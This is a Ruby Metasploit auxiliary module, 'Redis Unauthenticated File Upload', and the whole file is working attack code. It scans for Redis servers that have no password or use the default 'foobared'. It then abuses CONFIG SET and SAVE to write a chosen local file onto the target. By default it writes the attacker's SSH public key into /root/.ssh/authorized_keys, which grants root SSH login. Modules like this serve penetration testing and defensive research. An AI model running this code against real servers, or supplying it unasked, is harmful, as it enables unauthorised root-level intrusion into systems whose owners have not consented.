##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Redis Unauthenticated File Upload',
      'Description'   => %q(
        This module can save data to file in remote redis server,
        Because redis is unprotected without a password set up.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => ['Nixawk'],
      'References'    => [
        ['URL', 'http://antirez.com/news/96'],
        ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
        ['URL', 'http://redis.io/topics/protocol']
      ]))
    register_options(
      [
        Opt::RPORT(6379),
        OptPath.new('LocalFile', [true, 'Local file to be uploaded', '/root/.ssh/id_rsa.pub']),
        OptString.new('RemoteFile', [true, 'Remote file path', '/root/.ssh/authorized_keys']),
        OptString.new('AUTH_KEY', [false, 'Password for redis authentication', 'foobared'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('READ_TIMEOUT', [true, 'Seconds to wait while reading redis responses', 2])
      ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def read_timeout
    datastore['READ_TIMEOUT']
  end

  def redis_proto(parts)
    return if parts.blank?
    command = "*#{parts.length}\r\n"
    parts.each do |p|
      command << "$#{p.length}\r\n#{p}\r\n"
    end
    command
  end

  def redis_auth?(password)
    data = send_command(['AUTH', "#{password}"])
    if data && data.include?('+OK')
      true
    else
      false
    end
  end

  def send_command(command)
    sock.put("#{redis_proto(command)}")
    data = sock.get_once(-1, read_timeout)
    vprint_status("#{peer} - REDIS Command: #{command.join(' ').dump}")
    data
  end

  def send_file(path, content)
    key = Rex::Text.rand_text_alpha(32)
    commands = [
      ['CONFIG', 'SET', 'DIR', "#{File.dirname(path)}"],
      ['CONFIG', 'SET', 'dbfilename', "#{File.basename(path)}"],
      ['SET', "#{key}", "#{content}"],
      ['SAVE'],
      ['DEL', "#{key}"]
    ]

    results = []
    commands.each do |command|
      results << send_command(command)
    end

    return unless results[3] && results[3].include?('+OK')
    print_good("#{peer} - write data to redis server #{path}")
    report_note(
      type: 'redis_unauth_file_upload',
      host: rhost,
      port: rport,
      proto: 'tcp',
      data: "write data to redis server #{path}"
    )
  end

  def run_host(ip)
    begin
      connect
      res = send_command(['PING'])
      unless res
        print_status("#{peer} - No response")
        return
      end

      case res
      when /PONG/
        print_status("#{peer} - No authentication protection")
        content = "\n\n#{File.open(datastore['LocalFile']).read}\n\n\n"
        send_file(datastore['RemoteFile'], content)
      when /NOAUTH Authentication required/
        print_status("#{peer} - Trying to auth redis server")
        return unless redis_auth?(datastore['AUTH_KEY'])
        content = "\n\n#{File.open(datastore['LocalFile']).read}\n\n\n"
        send_file(datastore['RemoteFile'], content)
      else
        print_status("#{peer} - #{res}")
      end

    rescue ::Exception => e
      print_error("#{e}")
    ensure
      disconnect
    end
  end
end
